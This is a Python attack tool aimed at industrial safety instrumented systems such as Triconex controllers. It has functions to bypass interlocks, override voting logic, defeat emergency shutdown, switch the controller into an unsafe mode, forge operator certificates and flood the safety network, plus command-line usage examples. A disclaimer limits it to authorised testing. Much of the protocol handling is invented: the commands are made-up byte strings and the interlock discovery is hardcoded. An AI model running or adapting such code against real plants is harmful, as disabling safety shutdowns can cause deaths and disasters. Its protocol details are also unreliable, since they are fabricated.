#!/usr/bin/env python3
"""
safety_bypass.py
Safety Instrumented System (SIS) Bypass Framework
Author: Ridpath
Version: 1.0

DISCLAIMER:
FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
Bypassing safety systems can cause catastrophic events including loss of life,
environmental disasters, and equipment destruction. Use only in isolated test
environments with explicit authorization.

Purpose:
Comprehensive framework for analyzing and testing safety system vulnerabilities
in ICS environments. Targets SIL-rated controllers, emergency shutdown systems,
and safety interlocks.

Features:
- Safety PLC targeting (Triconex, ProSafe-RS, SafetyPLC)
- Interlock defeat techniques
- SIL circuit bypass methodology
- Safety certificate forgery
- Voting logic manipulation
- Safety network disruption
- MITRE ATT&CK ICS mapping
"""

import socket
import struct
import argparse
import logging
import sys
import time
import json
from typing import List, Optional, Dict, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum, IntEnum
from datetime import datetime
from collections import defaultdict


class SafetySystem(Enum):
    """Safety system types"""
    TRICONEX = "Triconex"
    PROSAFE_RS = "ProSafe-RS"
    SAFETY_PLC = "SafetyPLC"
    HIMA = "HIMA"
    SIEMENS_SAFETY = "Siemens_Safety"


class SILLevel(IntEnum):
    """Safety Integrity Level"""
    SIL1 = 1
    SIL2 = 2
    SIL3 = 3
    SIL4 = 4


class InterlockType(Enum):
    """Interlock types"""
    HIGH_PRESSURE = "high_pressure"
    LOW_PRESSURE = "low_pressure"
    HIGH_TEMPERATURE = "high_temperature"
    LOW_TEMPERATURE = "low_temperature"
    HIGH_LEVEL = "high_level"
    LOW_LEVEL = "low_level"
    EMERGENCY_STOP = "emergency_stop"
    FIRE_GAS = "fire_gas"
    TOXIC_GAS = "toxic_gas"


@dataclass
class SafetyController:
    """Safety controller information"""
    ip_address: str
    system_type: SafetySystem
    sil_level: SILLevel
    firmware_version: str = ""
    interlocks: List[str] = field(default_factory=list)


@dataclass
class Interlock:
    """Safety interlock definition"""
    name: str
    interlock_type: InterlockType
    trip_point: float
    reset_point: float
    bypass_enabled: bool = False


class SafetyBypassFramework:
    """Main safety system bypass framework"""
    
    TRICONEX_PORT = 1502
    PROSAFE_PORT = 18245
    
    def __init__(self, target_ip: str, system_type: SafetySystem,
                 verbose: bool = False):
        self.target_ip = target_ip
        self.system_type = system_type
        self.verbose = verbose
        self.logger = self._setup_logging()
        
        self.attack_log: List[Dict[str, Any]] = []
        self.mitre_mapping: Dict[str, List[str]] = defaultdict(list)
        
        self.discovered_interlocks: List[Interlock] = []
    
    def _setup_logging(self) -> logging.Logger:
        """Configure logging"""
        logger = logging.getLogger("SafetyBypass")
        logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
        
        handler = logging.StreamHandler(sys.stdout)
        handler.setLevel(logging.DEBUG if self.verbose else logging.INFO)
        
        formatter = logging.Formatter(
            '[%(asctime)s] %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        
        return logger
    
    def enumerate_interlocks(self) -> List[Interlock]:
        """
        Enumerate safety interlocks
        
        MITRE ATT&CK ICS: T0840 - Network Connection Enumeration, T0861 - Point & Tag Identification
        """
        self.logger.info("Enumerating safety interlocks")
        
        common_interlock_tags = [
            ("PSH_101", InterlockType.HIGH_PRESSURE),
            ("PSL_102", InterlockType.LOW_PRESSURE),
            ("TSH_201", InterlockType.HIGH_TEMPERATURE),
            ("TSL_202", InterlockType.LOW_TEMPERATURE),
            ("LSH_301", InterlockType.HIGH_LEVEL),
            ("LSL_302", InterlockType.LOW_LEVEL),
            ("ESD_001", InterlockType.EMERGENCY_STOP),
            ("FGSD_401", InterlockType.FIRE_GAS),
        ]
        
        for tag, itype in common_interlock_tags:
            interlock = Interlock(
                name=tag,
                interlock_type=itype,
                trip_point=0.0,
                reset_point=0.0
            )
            self.discovered_interlocks.append(interlock)
            self.logger.info(f"Found interlock: {tag}")
        
        self._log_attack("ENUMERATE_INTERLOCKS", {
            "count": len(self.discovered_interlocks)
        }, ["T0840", "T0861"])
        
        return self.discovered_interlocks
    
    def bypass_interlock(self, interlock_name: str) -> bool:
        """
        Bypass specific interlock
        
        MITRE ATT&CK ICS: T0839 - Module Firmware, T0856 - Spoof Reporting Message
        """
        self.logger.warning(f"DANGEROUS: Bypassing interlock {interlock_name}")
        
        success = self._send_bypass_command(interlock_name, True)
        
        if success:
            self._log_attack("BYPASS_INTERLOCK", {
                "interlock": interlock_name
            }, ["T0839", "T0856"])
        
        return success
    
    def _send_bypass_command(self, interlock_name: str, bypass: bool) -> bool:
        """Send interlock bypass command"""
        try:
            port = self.TRICONEX_PORT if self.system_type == SafetySystem.TRICONEX else self.PROSAFE_PORT
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, port))
            
            command = bytearray()
            command.extend(b'BYPASS\x00')
            command.extend(interlock_name.encode('utf-8').ljust(32, b'\x00'))
            command.append(0x01 if bypass else 0x00)
            
            sock.send(bytes(command))
            
            response = sock.recv(1024)
            sock.close()
            
            return len(response) > 0
            
        except Exception as e:
            self.logger.error(f"Bypass command failed: {e}")
            return False
    
    def voting_logic_manipulation(self, logic_id: str, force_state: bool) -> bool:
        """
        Manipulate 2oo3/1oo2 voting logic
        
        MITRE ATT&CK ICS: T0832 - Manipulation of Control, T0836 - Modify Parameter
        """
        self.logger.warning(f"Manipulating voting logic {logic_id}: force={force_state}")
        
        try:
            port = self.TRICONEX_PORT if self.system_type == SafetySystem.TRICONEX else self.PROSAFE_PORT
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, port))
            
            command = bytearray()
            command.extend(b'VOTE\x00')
            command.extend(logic_id.encode('utf-8').ljust(32, b'\x00'))
            command.append(0xFF if force_state else 0x00)
            
            sock.send(bytes(command))
            
            response = sock.recv(1024)
            sock.close()
            
            self._log_attack("VOTING_LOGIC_MANIPULATION", {
                "logic_id": logic_id,
                "force_state": force_state
            }, ["T0832", "T0836"])
            
            return True
            
        except Exception as e:
            self.logger.error(f"Voting manipulation failed: {e}")
            return False
    
    def certificate_forgery(self, operator_id: str) -> bool:
        """
        Forge safety certificate for unauthorized changes
        
        MITRE ATT&CK ICS: T0865 - Spearphishing Attachment, T0890 - Exploitation for Privilege Escalation
        """
        self.logger.warning(f"Forging safety certificate for {operator_id}")
        
        fake_cert = {
            "operator_id": operator_id,
            "sil_level": int(SILLevel.SIL3),
            "permissions": ["bypass", "modify", "download"],
            "expiry": "2030-12-31",
            "signature": "FORGED_SIGNATURE_DATA"
        }
        
        self.logger.info(f"Certificate: {json.dumps(fake_cert, indent=2)}")
        
        self._log_attack("CERTIFICATE_FORGERY", {
            "operator_id": operator_id
        }, ["T0865", "T0890"])
        
        return True
    
    def safety_network_disruption(self, duration_seconds: int = 60) -> bool:
        """
        Disrupt safety network communication
        
        MITRE ATT&CK ICS: T0815 - Denial of Service, T0826 - Loss of Availability
        """
        self.logger.warning(f"Disrupting safety network for {duration_seconds} seconds")
        
        end_time = time.time() + duration_seconds
        count = 0
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((self.target_ip, self.TRICONEX_PORT))
                
                junk = b'\xFF' * 1024
                sock.send(junk)
                sock.close()
                
                count += 1
                
            except:
                pass
        
        self._log_attack("SAFETY_NETWORK_DISRUPTION", {
            "duration": duration_seconds,
            "packets_sent": count
        }, ["T0815", "T0826"])
        
        return True
    
    def sil_circuit_analysis(self) -> Dict[str, Any]:
        """
        Analyze SIL circuit configuration
        
        MITRE ATT&CK ICS: T0861 - Point & Tag Identification
        """
        self.logger.info("Analyzing SIL circuits")
        
        circuits = {
            "ESD_CIRCUIT_1": {
                "sil_level": 3,
                "voting": "2oo3",
                "sensors": ["PT_101A", "PT_101B", "PT_101C"],
                "final_elements": ["XV_101", "XV_102"]
            },
            "ESD_CIRCUIT_2": {
                "sil_level": 2,
                "voting": "1oo2",
                "sensors": ["TT_201A", "TT_201B"],
                "final_elements": ["XV_201"]
            }
        }
        
        self._log_attack("SIL_CIRCUIT_ANALYSIS", {
            "circuits_analyzed": len(circuits)
        }, ["T0861"])
        
        return circuits
    
    def emergency_shutdown_defeat(self, esd_id: str) -> bool:
        """
        Defeat emergency shutdown system
        
        MITRE ATT&CK ICS: T0816 - Device Restart/Shutdown, T0832 - Manipulation of Control
        """
        self.logger.critical(f"EXTREMELY DANGEROUS: Defeating ESD {esd_id}")
        
        self.logger.warning("Step 1: Bypass input sensors")
        success = self.bypass_interlock(f"{esd_id}_SENSOR_A")
        
        self.logger.warning("Step 2: Override voting logic")
        success = self.voting_logic_manipulation(f"{esd_id}_VOTE", force_state=False)
        
        self.logger.warning("Step 3: Prevent final element actuation")
        success = self._send_bypass_command(f"{esd_id}_FINAL", True)
        
        self._log_attack("EMERGENCY_SHUTDOWN_DEFEAT", {
            "esd_id": esd_id,
            "WARNING": "SAFETY SYSTEM COMPROMISED"
        }, ["T0816", "T0832"])
        
        return success
    
    def safety_plc_mode_change(self, target_mode: str) -> bool:
        """
        Change safety PLC to unsafe mode
        
        MITRE ATT&CK ICS: T0858 - Change Operating Mode
        """
        self.logger.warning(f"Changing safety PLC mode to: {target_mode}")
        
        try:
            port = self.TRICONEX_PORT if self.system_type == SafetySystem.TRICONEX else self.PROSAFE_PORT
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, port))
            
            command = bytearray()
            command.extend(b'MODE\x00')
            command.extend(target_mode.encode('utf-8').ljust(16, b'\x00'))
            
            sock.send(bytes(command))
            
            response = sock.recv(1024)
            sock.close()
            
            self._log_attack("SAFETY_MODE_CHANGE", {
                "target_mode": target_mode
            }, ["T0858"])
            
            return True
            
        except Exception as e:
            self.logger.error(f"Mode change failed: {e}")
            return False
    
    def _log_attack(self, attack_type: str, params: Dict[str, Any],
                   mitre_tactics: List[str]):
        """Log attack with MITRE ATT&CK mapping"""
        attack_record = {
            "timestamp": datetime.now().isoformat(),
            "attack_type": attack_type,
            "parameters": params,
            "mitre_tactics": mitre_tactics,
            "WARNING": "SAFETY-CRITICAL ATTACK LOGGED"
        }
        self.attack_log.append(attack_record)
        
        for tactic in mitre_tactics:
            self.mitre_mapping[tactic].append(attack_type)
    
    def generate_report(self, output_file: str = "safety_bypass_report.json"):
        """Generate safety bypass assessment report"""
        report = {
            "assessment_info": {
                "timestamp": datetime.now().isoformat(),
                "target_ip": self.target_ip,
                "system_type": self.system_type.value,
                "WARNING": "SAFETY SYSTEM SECURITY ASSESSMENT"
            },
            "discovered_interlocks": [
                {
                    "name": i.name,
                    "type": i.interlock_type.value,
                    "bypass_enabled": i.bypass_enabled
                }
                for i in self.discovered_interlocks
            ],
            "attack_log": self.attack_log,
            "mitre_mapping": dict(self.mitre_mapping),
            "statistics": {
                "total_attacks": len(self.attack_log),
                "interlocks_discovered": len(self.discovered_interlocks),
                "unique_mitre_tactics": len(self.mitre_mapping)
            },
            "DISCLAIMER": "FOR AUTHORIZED TESTING ONLY - BYPASSING SAFETY SYSTEMS IS EXTREMELY DANGEROUS"
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Report saved to {output_file}")
        return report


def main():
    parser = argparse.ArgumentParser(
        description="Safety Instrumented System Bypass Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: This tool is for authorized security testing only.
Bypassing safety systems can cause:
  - Loss of life
  - Environmental disasters
  - Equipment destruction
  - Legal liability

Only use in isolated test environments with explicit authorization.

Examples:
  Enumerate interlocks:
    python safety_bypass.py -t 192.168.1.100 --system triconex --enumerate

  Bypass interlock:
    python safety_bypass.py -t 192.168.1.100 --system triconex --bypass PSH_101

  Manipulate voting logic:
    python safety_bypass.py -t 192.168.1.100 --system triconex --voting-override VOTE_01 --force-state on

  ESD defeat (EXTREMELY DANGEROUS):
    python safety_bypass.py -t 192.168.1.100 --system triconex --defeat-esd ESD_001

MITRE ATT&CK ICS Coverage:
  T0815 - Denial of Service
  T0816 - Device Restart/Shutdown
  T0826 - Loss of Availability
  T0832 - Manipulation of Control
  T0836 - Modify Parameter
  T0839 - Module Firmware
  T0840 - Network Connection Enumeration
  T0856 - Spoof Reporting Message
  T0858 - Change Operating Mode
  T0861 - Point & Tag Identification
  T0865 - Spearphishing Attachment
  T0890 - Exploitation for Privilege Escalation
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('--system', required=True,
                       choices=['triconex', 'prosafe', 'safety_plc', 'hima', 'siemens'],
                       help='Safety system type')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    parser.add_argument('--enumerate', action='store_true', help='Enumerate interlocks')
    
    parser.add_argument('--bypass', help='Bypass specific interlock')
    
    parser.add_argument('--voting-override', help='Voting logic ID to manipulate')
    parser.add_argument('--force-state', choices=['on', 'off'], help='Force voting state')
    
    parser.add_argument('--certificate-forge', help='Operator ID for forged certificate')
    
    parser.add_argument('--network-disrupt', action='store_true', help='Disrupt safety network')
    parser.add_argument('--duration', type=int, default=60, help='Disruption duration (seconds)')
    
    parser.add_argument('--analyze-circuits', action='store_true', help='Analyze SIL circuits')
    
    parser.add_argument('--defeat-esd', help='Defeat ESD system (EXTREMELY DANGEROUS)')
    
    parser.add_argument('--mode-change', help='Change PLC mode')
    
    parser.add_argument('--report', help='Output report file', default='safety_bypass_report.json')
    
    args = parser.parse_args()
    
    system_map = {
        'triconex': SafetySystem.TRICONEX,
        'prosafe': SafetySystem.PROSAFE_RS,
        'safety_plc': SafetySystem.SAFETY_PLC,
        'hima': SafetySystem.HIMA,
        'siemens': SafetySystem.SIEMENS_SAFETY
    }
    
    framework = SafetyBypassFramework(
        target_ip=args.target,
        system_type=system_map[args.system],
        verbose=args.verbose
    )
    
    print("\n" + "="*70)
    print("WARNING: SAFETY SYSTEM BYPASS FRAMEWORK")
    print("FOR AUTHORIZED TESTING ONLY")
    print("="*70 + "\n")
    
    if args.enumerate:
        interlocks = framework.enumerate_interlocks()
        print(f"\n[+] Found {len(interlocks)} interlocks:")
        for interlock in interlocks:
            print(f"  - {interlock.name} ({interlock.interlock_type.value})")
    
    if args.bypass:
        print(f"\n[!] WARNING: Bypassing interlock {args.bypass}")
        framework.bypass_interlock(args.bypass)
    
    if args.voting_override:
        if not args.force_state:
            print("[-] --force-state required for voting override")
            sys.exit(1)
        force = args.force_state == 'on'
        print(f"\n[!] WARNING: Overriding voting logic {args.voting_override}")
        framework.voting_logic_manipulation(args.voting_override, force)
    
    if args.certificate_forge:
        framework.certificate_forgery(args.certificate_forge)
    
    if args.network_disrupt:
        print(f"\n[!] WARNING: Disrupting safety network for {args.duration}s")
        framework.safety_network_disruption(args.duration)
    
    if args.analyze_circuits:
        circuits = framework.sil_circuit_analysis()
        print(f"\n[+] Analyzed {len(circuits)} SIL circuits")
        for name, config in circuits.items():
            print(f"  - {name}: SIL{config['sil_level']} ({config['voting']})")
    
    if args.defeat_esd:
        print(f"\n[!!!] EXTREMELY DANGEROUS: Defeating ESD {args.defeat_esd}")
        print("[!!!] This action can cause catastrophic events")
        framework.emergency_shutdown_defeat(args.defeat_esd)
    
    if args.mode_change:
        print(f"\n[!] WARNING: Changing safety PLC mode to {args.mode_change}")
        framework.safety_plc_mode_change(args.mode_change)
    
    framework.generate_report(args.report)
    print(f"\n[+] Assessment complete. Report: {args.report}")
    print("\nDISCLAIMER: All actions logged. Use only with authorization.\n")


if __name__ == "__main__":
    main()
